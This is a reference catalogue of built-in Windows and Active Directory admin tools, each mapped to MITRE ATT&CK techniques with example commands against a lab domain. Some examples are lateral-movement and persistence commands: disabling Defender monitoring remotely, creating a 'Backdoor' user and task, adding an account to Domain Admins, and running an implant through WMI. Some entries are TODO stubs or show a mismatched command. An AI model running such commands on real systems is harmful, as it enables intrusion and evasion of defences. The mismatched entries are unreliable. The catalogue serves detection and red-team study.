#### Resolve-DnsName
Performs a DNS name query resolution for the specified name; Type: Cmdlet; MITRE ATT&CK: T1590.002; Toolsets: Builtin
**Categories:** Builtin, Cmdlet, Network, T1590.002
```
Resolve-DnsName -Type SRV _kerberos._tcp.ad.bitsadmin.com
```

#### Restart-Computer
Restarts the operating system on local and remote computers; Type: Cmdlet; MITRE ATT&CK: T1529; Toolsets: Builtin
**Categories:** Builtin, Cmdlet, Sessions, T1529
```
Restart-Computer -ComputerName W10.ad.bitsadmin.com,W11.ad.bitsadmin.com
```

#### rsop.msc
Resultant Set of Policy; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, Domain, GUI, MMC Snap-in
```
rsop.msc
```

#### secpol.msc
Local Security Policy; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
gpedit.msc
```

#### services.msc
Services; Type: MMC Snap-in; MITRE ATT&CK: T1569.002; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage, T1569.002
```
services.msc /computer:DC1.ad.bitsadmin.com
```

#### Set-CimInstance
Modifies a CIM instance on a CIM server by calling the ModifyInstance method of the CIM class; Type: Cmdlet; MITRE AT...
**Categories:** Builtin, CIMSession, Cmdlet, Manage, T1047
```
Set-CimInstance -Query 'Select * from Win32_Environment where name LIKE "testvar%"' -Property @{VariableValue="abcd"}
```

#### Set-MpPreference
Configures preferences for Windows Defender scans and updates; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin,...
**Categories:** Builtin, CIMSession, Cmdlet, Manage, T1047
```
Set-MpPreference -CimSession $s -DisableRealtimeMonitoring $true
```

#### Set-NetConnectionProfile
Changes the network category of a connection profile; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Set-NetConnectionProfile -CimSession $s -InterfaceAlias 'Ethernet0' -NetworkCategory Private
```

#### Set-NetFirewallProfile
Configures settings that apply to the per-profile configurations of the Windows Firewall with Advanced Security; Type...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Set-NetFirewallProfile -CimSession $s
```

#### Set-NetFirewallRule
Modifies existing firewall rules; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Set-NetFirewallRule -CimSession $s
```

#### Set-NetFirewallSetting
Modifies the global firewall settings of the target computer; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, C...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Set-NetFirewallSetting -CimSession $s
```

#### Set-NetNat
Modifies settings for NAT objects; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Set-NetNat -CimSession $s
```

#### Set-NetNatGlobal
Modifies global settings for NAT instances on a computer; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSe...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Set-NetNatGlobal -CimSession $s
```

#### Set-NetRoute
Modifies an entry or entries in the IP routing table; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSessio...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Set-NetRoute -CimSession $s
```

#### Set-ScheduledTask
Modifies a scheduled task; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Processes, T1047, TODO
```
Set-ScheduledTask -CimSession $s
```

#### Set-WSManInstance
Modifies the management information that is related to a resource; Type: Cmdlet; Toolsets: Builtin, TODO
**Categories:** Builtin, Cmdlet, Manage, TODO
```
Set-WSManInstance
```

#### Show-EventLog
Displays the event logs of the local or a remote computer in Event Viewer; Type: Cmdlet; Toolsets: Builtin, GUI
**Categories:** Builtin, Cmdlet, GUI, Logs
```
Show-EventLog -ComputerName W10.ad.bitsadmin.com
```

#### Show-NetFirewallRule
Displays all of the existing IPsec rules and associated objects in a fully expanded view; Type: Cmdlet; MITRE ATT&CK:...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Show-NetFirewallRule -CimSession $s
```

#### slmgr.vbs
Obtain volume activation information; Type: Script; Toolsets: Builtin
**Categories:** Builtin, Misc, Script
```
cscript.exe slmgr.vbs W10.ad.bitsadmin.com /dlv
```

#### Start-DscConfiguration
Applies configuration to nodes; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Manage, T1047, TODO
```
Start-DscConfiguration -CimSession $s
```

#### Start-NetEventSession
Starts event and packet capture for a network event session; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CI...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Start-NetEventSession -Name sess -CimSession $s
```

#### Start-ScheduledTask
Starts one or more instances of a scheduled task; Type: Cmdlet; MITRE ATT&CK: T1047, T1053.005; Toolsets: Builtin, CI...
**Categories:** Builtin, CIMSession, Cmdlet, Execute, T1047, T1053.005
```
Start-ScheduledTask -CimSession $s -TaskName Backdoor
```

#### Start-VM
Starts a virtual machine; Type: Cmdlet; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Manage
```
Start-VM -Name 'Windows 10 22H2' -CimSession $s
```

#### StdRegProv
The StdRegProv class contains methods that manipulate system registry keys and values; Type: WMI Class; Toolsets: Bui...
**Categories:** Builtin, CIMSession, Registry, WMI Class
```
Invoke-CimMethod -ClassName StdRegProv -MethodName GetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="Shadow"} -CimSession $s
```

#### Stop-Computer
Stops (shuts down) local and remote computers; Type: Cmdlet; MITRE ATT&CK: T1529; Toolsets: Builtin
**Categories:** Builtin, Cmdlet, Sessions, T1529
```
Stop-Computer -ComputerName W10.ad.bitsadmin.com,w11.ad.bitsadmin.com -Force
```

#### Stop-EtwTraceSession
Stops the specified ETW session; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Stop-EtwTraceSession -CimSession $s
```

#### Stop-NetEventSession
Stops event and packet capture for a network event session; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIM...
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Stop-NetEventSession -Name sess -CimSession $s
```

#### taskschd.msc
Task Scheduler; Type: MMC Snap-in; MITRE ATT&CK: T1053.005; Toolsets: Builtin, GUI
**Categories:** Builtin, Execute, GUI, MMC Snap-in, T1053.005
```
taskschd.msc
```

#### Test-Connection
Sends ICMP echo request packets, or pings, to one or more computers.; Type: Cmdlet; Toolsets: Builtin, TODO
**Categories:** Builtin, Cmdlet, Network, TODO
```
Test-Connection DC1.ad.bitsadmin.com
```

#### Test-NetConnection
Displays diagnostic information for a connection; Type: Cmdlet; Toolsets: Builtin, TODO
**Categories:** Builtin, Cmdlet, Network, TODO
```
Test-NetConnection
```

#### tpm.msc
Trusted Platform Module (TPM) Management; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
mmc.exe
```

#### Unregister-ScheduledTask
Unregisters a scheduled task; Type: Cmdlet; MITRE ATT&CK: T1047, T1053.005; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Execute, T1047, T1053.005
```
Unregister-ScheduledTask -CimSession $s Backdoor -Confirm:$false
```

#### WF.msc
Windows Defender Firewall with Advanced Security; Type: MMC Snap-in; MITRE ATT&CK: T1562.004; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage, T1562.004
```
mmc.exe
```

#### Win32_DfsNode
Represents a root or a link of a domain based or a standalone distributed file system (DFS); Type: WMI Class; Toolset...
**Categories:** Builtin, CIMSession, Data, TODO, WMI Class

#### Win32_Environment
Represents an environment or system environment setting on a Windows computer system; Type: WMI Class; Toolsets: Buil...
**Categories:** Builtin, CIMSession, Manage, WMI Class
```
New-CimInstance -ClassName Win32_Environment -Property @{Name="PATH";VariableValue="C:\hackertools; C:\Windows\System32;C:\Windows";UserName="<SYSTEM>"} -CimSession $s
```

#### Win32_NTLogEvent
Displays the Windows Event Log; Type: WMI Class; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Logs, WMI Class
```
Get-CimInstance -ClassName Win32_NTLogEvent -Filter "LogFile = 'Security' AND EventCode = '4624'" -CimSession $s
```

#### Win32_OperatingSystem
Represents a Windows-based operating system installed on a computer; Type: WMI Class; MITRE ATT&CK: TA0043; Toolsets:...
**Categories:** Builtin, CIMSession, Recon, TA0043, WMI Class
```
Get-CimInstance Win32_OperatingSystem -CimSession $s | fl *
```

#### Win32_Process
Represents a process on an operating system; Type: WMI Class; MITRE ATT&CK: TA0002; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Execute, Processes, TA0002, WMI Class
```
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'C:\tmp\implant.exe'} -CimSession $s
```

#### Win32_Product
Represent products as they are installed by MSI; Type: WMI Class; MITRE ATT&CK: T1218.007, T1562.001; Toolsets: Built...
**Categories:** Builtin, CIMSession, Execute, Manage, T1218.007, T1562.001, WMI Class
```
Get-CimInstance -ClassName Win32_Product -CimSession $s | Select-Object Caption,Vendor,Version,InstallLocation
```

#### Win32_QuickFixEngineering
Represents a small system-wide update, commonly referred to as a quick-fix engineering (QFE) update, applied to the c...
**Categories:** Builtin, CIMSession, Recon, TA0043, WMI Class
```
Get-CimInstance Win32_QuickFixEngineering -CimSession $s
```

#### Win32_Service
Represents a service on a computer system running Windows; Type: WMI Class; MITRE ATT&CK: T1569.002, TA0002; Toolsets...
**Categories:** Builtin, CIMSession, Execute, Processes, T1569.002, TA0002, WMI Class
```
$tssvc = Get-CimInstance -Filter 'Name="TermService"' -ClassName Win32_Service -CimSession $s
$tssvc
$tssvc | Invoke-CimMethod -MethodName StartService

```

#### Win32_ShadowCopy
Storage extent that represents a duplicate copy of the original volume at a previous time; Type: WMI Class; Toolsets:...
**Categories:** Builtin, CIMSession, Data, WMI Class
```
$r = Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume='C:\'} -CimSession $s
$r

```

#### Win32_SystemDriver
Represents the system driver for a base service; Type: WMI Class; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Processes, TODO, WMI Class

#### winrm.cmd
Windows Remote Management; Type: Script; MITRE ATT&CK: T1021.006, T1047, T1057; Toolsets: Builtin
**Categories:** Builtin, Execute, Processes, Script, T1021.006, T1047, T1057
```
winrm.vbs get wmicimv2/Win32_Process?Handle=3456 -r:W10.ad.bitsadmin.com
```

#### WmiMgmt.msc
WMI Control; Type: MMC Snap-in; MITRE ATT&CK: T1047; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage, T1047
```
WmiMgmt.msc
```

#### Write-EventLog
Writes an event to an event log.; Type: Cmdlet; Toolsets: Builtin, TODO
**Categories:** Builtin, Cmdlet, Logs, TODO
```
Write-EventLog
```

#### wsecedit.dll
Security Configuration and Analysis; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
mmc.exe
```

### chrome

#### Edge/Chromium Browsers
Bizarre sub-processes.


   
Browsers based on Chromium will launch several sub-processes that look extremely suspici...
**Categories:** chrome, edge, windows, linux, commandline

### CIMSession

#### Add-DnsClientNrptRule
Adds a rule to the NRPT; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: CIMSession, TODO
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Add-DnsClientNrptRule -CimSession $s
```

#### Get-DfsnFolder
Gets settings for a DFS namespace folder; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: CIMSession, TODO
**Categories:** CIMSession, Cmdlet, Data, T1047, TODO
```
Get-DfsnFolder -CimSession $s
```

#### Get-DfsnFolderTarget
Gets settings for targets of a DFS namespace folder; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: CIMSession, TODO
**Categories:** CIMSession, Cmdlet, Data, T1047, TODO
```
Get-DfsnFolderTarget -CimSession $s
```

#### Get-DfsnRoot
Gets settings for DFS namespaces; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: CIMSession, TODO
**Categories:** CIMSession, Cmdlet, Data, T1047, TODO
```
Get-DfsnRoot -CimSession $s
```

#### Get-DfsnRootTarget
Gets settings for root targets of a DFS namespace; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: CIMSession, TODO
**Categories:** CIMSession, Cmdlet, Data, T1047, TODO
```
Get-DfsnRootTarget -CimSession $s
```

#### Get-DhcpServerAuditLog
Gets the configuration parameters related to the audit log of the Dynamic Host Configuration Protocol (DHCP) server s...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DhcpServerAuditLog -CimSession $s
```

#### Get-DhcpServerDatabase
Gets the configuration parameters related to the database of the Dynamic Host Configuration Protocol (DHCP) server se...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DhcpServerDatabase -CimSession $s
```

#### Get-DhcpServerDnsCredential
Gets an account that the DHCP Server service uses to register or deregister client records on a DNS server; Type: Cmd...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DhcpServerDnsCredential -CimSession $s
```

#### Get-DhcpServerInDC
Retrieves the list of authorized computers running the Dynamic Host Configuration Protocol (DHCP) server service from...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DhcpServerInDC -CimSession $s
```

#### Get-DhcpServerSetting
Gets the configuration parameters of the database of the Dynamic Host Configuration Protocol (DHCP) server service; T...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DhcpServerSetting -CimSession $s
```

#### Get-DhcpServerv4DnsSetting
Gets the DNS settings configured on the Dynamic Host Configuration Protocol (DHCP) server service for a specific scop...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DhcpServerv4DnsSetting -CimSession $s
```

#### Get-DhcpServerv4Filter
Gets the list of all MAC addresses from the allow list or the deny list on the Dynamic Host Configuration Protocol (D...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DhcpServerv4Filter -CimSession $s
```

#### Get-DhcpServerv4FilterList
Gets the enabled state of the allow filter list and deny filter list set on the Dynamic Host Configuration Protocol (...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DhcpServerv4FilterList -CimSession $s
```

#### Get-DhcpServerv4Lease
Gets one or more lease records from the Dynamic Host Configuration Protocol (DHCP) server service; Type: Cmdlet; MITR...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DhcpServerv4Lease -CimSession $s
```

#### Get-DnsClientNrptRule
Retrieves the DNS client NRPT rules; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: CIMSession, TODO
**Categories:** CIMSession, Cmdlet, Network, T1047, TODO
```
Get-DnsClientNrptRule -CimSession $s
```

#### Get-DnsClientServerAddress
Gets DNS server IP addresses from the TCP/IP properties on an interface; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets:...
**Categories:** CIMSession, Cmdlet, Network, T1047, TODO
```
Get-DnsClientServerAddress -CimSession $s
```

#### Get-DnsServer
Retrieves a DNS server configuration; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: CIMSession, RSAT
**Categories:** CIMSession, Cmdlet, Network, RSAT, T1047
```
Get-DnsServer -CimSession $s
```

#### Get-DnsServerCache
Retrieves DNS server cache settings; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: CIMSession, TODO
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DnsServerCache -CimSession $s
```

#### Get-DnsServerForwarder
Gets forwarder configuration settings on a DNS server; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: CIMSession, TODO
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Get-DnsServerForwarder -CimSession $s
```

#### Get-NfsSession
Gets information about which client computers are currently connected to one or more shares on an NFS server; Type: C...
**Categories:** CIMSession, Cmdlet, Data, T1047, TODO
```
Get-NfsSession -CimSession $s
```

#### Get-NfsShare
Gets NFS shares on an NFS server; Type: Cmdlet; MITRE ATT&CK: T1047, T1135; Toolsets: CIMSession, TODO
**Categories:** CIMSession, Cmdlet, Data, T1047, T1135, TODO
```
Get-NfsShare -CimSession $s
```

#### Get-RemoteAccess
Displays the configuration of DirectAccess (DA) and VPN (both Remote Access VPN and site-to-site VPN); Type: Cmdlet;...
**Categories:** CIMSession, Cmdlet, Processes, T1047, TODO
```
Get-RemoteAccess -CimSession $s
```

#### Remove-DhcpServerv4Lease
Deletes the specified IPv4 address lease record from the Dynamic Host Configuration Protocol (DHCP) server service; T...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Remove-DhcpServerv4Lease -CimSession $s
```

#### Set-DhcpServerAuditLog
Sets the Dynamic Host Configuration Protocol (DHCP) server service audit log configuration on the DHCP server service...
**Categories:** CIMSession, Cmdlet, Manage, T1047, TODO
```
Set-DhcpServerAuditLog -CimSession $s
```

#### Show-DnsServerCache
Shows the records in a DNS Server Cache; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: CIMSession, RSAT
**Categories:** CIMSession, Cmdlet, Network, RSAT, T1047
```
Show-DnsServerCache -CimSession $s
```

### Cmdlet

#### Add-ADGroupMember
Adds one or more members to an Active Directory group; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Add-ADGroupMember 'Domain Admins' -Members Hacker
```

#### Backup-GPO
Backs up one GPO or all the GPOs in a domain; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Backup-Gpo -Domain ad.bitsadmin.com -All -Path C:\tmp\GPOBackups
```

#### Disable-ADAccount
Disables an Active Directory account; Type: Cmdlet; MITRE ATT&CK: T1531; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT, T1531
```
Disable-ADAccount -Identity Hacker
```

#### Enable-ADAccount
Enables an Active Directory account; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Enable-ADAccount
```

#### Get-ADComputer
Gets one or more Active Directory computers; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADComputer -SearchBase "OU=Domain Controllers,DC=ad,DC=bitsadmin,DC=com" -Filter *
```

#### Get-ADComputerServiceAccount
Gets the service accounts hosted by a computer; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Get-ADComputerServiceAccount
```

#### Get-ADDomain
Gets an Active Directory domain; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADDomain ad.bitsadmin.com
```

#### Get-ADDomainController
Gets one or more Active Directory domain controllers based on discoverable services criteria, search parameters or by...
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADDomainController -Filter * -Server ad.bitsadmin.com
```

#### Get-ADForest
Gets an Active Directory forest; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADForest -Server ad.bitsadmin.com
```

#### Get-ADGroup
Gets one or more Active Directory groups; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADGroup -Filter * -Server ad.bitsadmin.com
```

#### Get-ADGroupMember
Gets the members of an Active Directory group; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADGroupMember "Domain Admins" -Recursive -Server ad.bitsadmin.com
```

#### Get-ADObject
Gets one or more Active Directory objects; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo, userAccountControl
```

#### Get-ADOrganizationalUnit
Gets one or more Active Directory organizational units; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADOrganizationalUnit 'OU=Domain Controllers,DC=ad,DC=bitsadmin,DC=com'
```

#### Get-ADReplicationSubnet
Returns a specific Active Directory subnet or a set of AD subnets based on a specified filter.; Type: Cmdlet; Toolset...
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADReplicationSubnet -Filter * -Server ad.bitsadmin.com | select Name,Location,Site
```

#### Get-ADTrust
Returns all trusted domain objects in the directory; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADTrust -Filter * -Server ad.bitsadmin.com | ft Direction,Name,TrustType
```

#### Get-ADUser
Gets one or more Active Directory users; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Get-ADUser -Filter {DoesNotRequirePreauth -eq $true}
```

#### Get-AppvVirtualProcess
Displays the virtual processes running on a computer; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Manage, RSAT, TODO
```
Get-AppvVirtualProcess
```

#### Get-GPPermission
Gets the permission level for one or more security principals on a specified GPO; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Get-GPPermission
```

#### Get-WindowsFeature
Gets information about Windows Server roles, role services, and features that are available for installation and inst...
**Categories:** Cmdlet, Manage, RSAT, TODO
```
Get-WindowsFeature
```

#### Install-WindowsFeature
Installs one or more roles, role services, or features on either the local or a specified remote server that is runni...
**Categories:** Cmdlet, Manage, RSAT, TODO
```
Install-WindowsFeature
```

#### New-ADComputer
Creates a new Active Directory computer; Type: Cmdlet; MITRE ATT&CK: T1136.002; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT, T1136.002
```
$account = 'MyComputer'
$password = 'Password1!'
$domain = 'ad.bitsadmin.com'
New-ADComputer -Name $account -SAMAccountName $account -AccountPassword (ConvertTo-SecureString $password -Force -AsPlainText) -Verbose -DNSHostName "$account.$domain" -ServicePrincipalNames @("HOST/$account.$domain","RestrictedKrbHost/$account.$domain","HOST/$account","RestrictedKrbHost/$account")

```

#### New-ADGroup
Creates an Active Directory group; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
New-ADGroup
```

#### New-ADObject
Creates an Active Directory object; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
New-ADObject
```

#### New-ADOrganizationalUnit
Creates a new Active Directory organizational unit; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
New-ADOrganizationalUnit -Name GPO_Test -Path "OU=Azure,OU=Servers,DC=ad,DC=bitsadmin,DC=com"
```

#### New-ADServiceAccount
Creates a new Active Directory managed service account or group managed service account object; Type: Cmdlet; MITRE A...
**Categories:** Cmdlet, Domain, RSAT, T1136.002, TODO
```
New-ADServiceAccount
```

#### New-ADUser
Creates a new Active Directory user; Type: Cmdlet; MITRE ATT&CK: T1136.002; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT, T1136.002
```
New-ADUser -Name "Backdoor" -AccountPassword (ConvertTo-SecureString "MyPassword!" -Force -AsPlainText) -Enabled $true
```

#### New-GPLink
Links a GPO to a site, domain, or OU; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
New-GPLink
```

#### New-GPO
Creates a GPO; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
New-GPO -Name RunImmediateScheduledTask
```

#### Remove-ADUser
Removes an Active Directory user; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Remove-ADUser
```

#### Rename-ADObject
Changes the name of an Active Directory object; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Rename-ADObject
```

#### Search-ADAccount
Gets Active Directory user, computer, or service accounts; Type: Cmdlet; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT
```
Search-ADAccount -AccountInactive -TimeSpan 30
```

#### Set-ADAccountControl
Modifies user account control (UAC) values for an Active Directory account; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Set-ADAccountControl
```

#### Set-ADAccountExpiration
Sets the expiration date for an Active Directory account; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Set-ADAccountExpiration
```

#### Set-ADAccountPassword
Modifies the password of an Active Directory account; Type: Cmdlet; MITRE ATT&CK: T1531; Toolsets: RSAT
**Categories:** Cmdlet, Domain, RSAT, T1531
```
$new = ConvertTo-SecureString 'NewPassword1!' -A -F
Set-ADAccountPassword -Identity MyAccount -Reset -NewPassword $new

```

#### Set-ADGroup
Modifies an Active Directory group; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Set-ADGroup
```

#### Set-ADObject
Modifies an Active Directory object; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Set-ADObject
```

#### Set-ADServiceAccount
Modifies an Active Directory managed service account or group managed service account object; Type: Cmdlet; Toolsets:...
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Set-ADServiceAccount
```

#### Set-ADUser
Modifies an Active Directory user; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Set-ADUser
```

#### Uninstall-WindowsFeature
Uninstalls specified Windows Server roles, role services, and features from a computer that is running Windows Server...
**Categories:** Cmdlet, Manage, RSAT, TODO
```
Uninstall-WindowsFeature
```

#### Unlock-ADAccount
Unlocks an Active Directory account; Type: Cmdlet; Toolsets: RSAT, TODO
**Categories:** Cmdlet, Domain, RSAT, TODO
```
Unlock-ADAccount
```

### Data

#### dfsmgmt.msc
DFS Management; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** Data, GUI, MMC Snap-in, RSAT
```
dfsmgmt.msc
```

### Domain

#### AdRmsAdmin.msc
Active Directory Rights Management Services; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** Domain, GUI, MMC Snap-in, RSAT
```
AdRmsAdmin.msc
```

#### domain.msc
Active Directory Domains and Trusts; Type: MMC Snap-in; MITRE ATT&CK: T1484.002; Toolsets: GUI, RSAT
**Categories:** Domain, GUI, MMC Snap-in, RSAT, T1484.002
```
domain.msc /server=DC1.ad.bitsadmin.com
```

#### dsa.msc
Active Directory Users and Computers; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** Domain, GUI, MMC Snap-in, RSAT
```
dsa.msc /server=DC1.ad.bitsadmin.com
```

#### dssite.msc
Active Directory Sites and Services; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** Domain, GUI, MMC Snap-in, RSAT
```
dssite.msc /domain=AD.BITSADMIN.COM
```

#### gpmc.msc
Group Policy Management; Type: MMC Snap-in; MITRE ATT&CK: T1037.003, T1484.001; Toolsets: GUI, RSAT
**Categories:** Domain, GUI, MMC Snap-in, RSAT, T1037.003, T1484.001
```
gpmc.msc /domain:ad.bitsadmin.com
```

#### gpme.msc
Group Policy Management Editor; Type: MMC Snap-in; MITRE ATT&CK: T1053.005; Toolsets: GUI, RSAT
**Categories:** Domain, GUI, MMC Snap-in, RSAT, T1053.005
```
gpme.msc /gpobject:"LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ad,DC=bitsadmin,DC=com"
```

#### gptedit.msc
Group Policy Starter GPO Editor; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** Domain, GUI, MMC Snap-in, RSAT
```
gptedit.msc /s /gtmpobject:"\\DC1.ad.bitsadmin.com\sysvol\ad.bitsadmin.com\StarterGPOs\{DE3EB8C2-A808-4509-9D89-D383F950AEDB}\"
```

#### schmmgmt.dll
Active Directory Schema; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** Domain, GUI, MMC Snap-in, RSAT
```
mmc.exe
```

### easeus

#### EaseUS spaceman.exe
EaseUS and bizarre Scheduled Tasks.



The file is associated with EaseUS Partition Manager or Hard Drive Tools 2003...
**Categories:** easeus, windows, scheduledtask

### eset

#### ESET Protection Suite
Everybody loves a big DNS query!



Various modules of ESET protection suite (Antispam, Parental Controls, LiveGrid)...
**Categories:** eset, windows, dns

### Extra

#### ospp.vbs
Configure volume licensed versions of Office products; Type: Script; Toolsets: Extra
**Categories:** Extra, Misc, Script
```
cscript.exe ospp.vbs W10.ad.bitsadmin.com /dstatusall
```

#### SQLServerManager15.msc
SQL Server 2019 Configuration Manager; Type: MMC Snap-in; Toolsets: Extra, GUI
**Categories:** Extra, GUI, MMC Snap-in, Manage
```
SQLServerManager15.msc /computer:SQL1.ad.bitsadmin.com
```

#### SQLServerManager16.msc
SQL Server 2022 Configuration Manager; Type: MMC Snap-in; Toolsets: Extra, GUI
**Categories:** Extra, GUI, MMC Snap-in, Manage
```
SQLServerManager16.msc /computer:SQL1.ad.bitsadmin.com
```

### GUI

#### adsiedit.msc
ADSI Edit; Type: MMC Snap-in; Toolsets: GUI, RSAT
